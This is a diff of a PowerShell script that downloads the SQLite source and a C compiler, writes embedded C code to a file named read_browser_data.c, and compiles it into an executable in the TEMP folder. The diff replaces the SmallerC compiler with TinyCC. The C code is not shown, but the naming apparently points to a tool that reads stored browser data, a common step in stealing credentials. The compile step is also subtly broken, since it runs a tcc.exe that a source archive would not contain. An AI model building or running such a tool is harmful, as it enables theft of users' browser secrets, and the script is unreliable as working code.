@@ -1,10 +1,10 @@
 # Define the URLs for the downloads
 $sqliteUrl = "https://github.com/sqlite/sqlite/archive/refs/heads/master.zip"
-$smallerCUrl = "https://github.com/alexfru/SmallerC/archive/refs/heads/master.zip"
+$tccUrl = "https://github.com/TinyCC/tinycc/archive/refs/heads/mob.zip"
 $zipFilePath = "$env:TEMP\sqlite.zip"
-$smallerCZipPath = "$env:TEMP\smallerC.zip"
+$tccZipPath = "$env:TEMP\tcc.zip"
 $sqliteExtractPath = "$env:ProgramFiles\SQLite"
-$smallerCExtractPath = "$env:ProgramFiles\SmallerC"
+$tccExtractPath = "$env:ProgramFiles\TinyCC"
 
 # Download the SQLite source ZIP file
 Write-Output "Downloading SQLite source..."
@@ -22,21 +22,21 @@ Expand-Archive -Path $zipFilePath -DestinationPath $sqliteExtractPath -Force
 # Clean up SQLite ZIP file
 Remove-Item -Path $zipFilePath
 
-# Download SmallerC
-Write-Output "Downloading SmallerC..."
-Invoke-WebRequest -Uri $smallerCUrl -OutFile $smallerCZipPath
+# Download TCC
+Write-Output "Downloading TCC..."
+Invoke-WebRequest -Uri $tccUrl -OutFile $tccZipPath
 
 # Create the extraction directory if it doesn't exist
-if (-Not (Test-Path -Path $smallerCExtractPath)) {
-    New-Item -ItemType Directory -Path $smallerCExtractPath
+if (-Not (Test-Path -Path $tccExtractPath)) {
+    New-Item -ItemType Directory -Path $tccExtractPath
 }
 
-# Extract the SmallerC ZIP file
-Write-Output "Extracting SmallerC..."
-Expand-Archive -Path $smallerCZipPath -DestinationPath $smallerCExtractPath -Force
+# Extract the TCC ZIP file
+Write-Output "Extracting TCC..."
+Expand-Archive -Path $tccZipPath -DestinationPath $tccExtractPath -Force
 
-# Clean up SmallerC ZIP file
-Remove-Item -Path $smallerCZipPath
+# Clean up TCC ZIP file
+Remove-Item -Path $tccZipPath
 
 # Define the C code
 $cCode = @'
@@ -148,10 +148,10 @@ int main() {
 $cFilePath = "$env:TEMP\read_browser_data.c"
 Set-Content -Path $cFilePath -Value $cCode
 
-# Compile the C code using SmallerC
+# Compile the C code using TCC
 Write-Output "Compiling the C code..."
-cd "$smallerCExtractPath\SmallerC-master\v0100\bind"
-.\smlrc.exe -o "$env:TEMP\read_browser_data.exe" $cFilePath
+cd "$tccExtractPath\tinycc-mob"
+.\tcc.exe -o "$env:TEMP\read_browser_data.exe" $cFilePath
 
 Write-Output "Compilation completed successfully!"
 
